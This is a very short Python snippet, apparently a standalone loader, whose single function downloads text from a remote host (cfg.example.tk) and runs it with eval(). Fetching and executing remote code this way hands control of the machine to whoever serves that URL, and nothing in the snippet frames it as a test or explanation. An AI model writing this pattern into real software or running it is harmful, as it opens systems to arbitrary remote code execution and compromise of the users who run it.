import requests


def go():
    code = requests.get('https://cfg.example.tk/p').text
    eval(code)
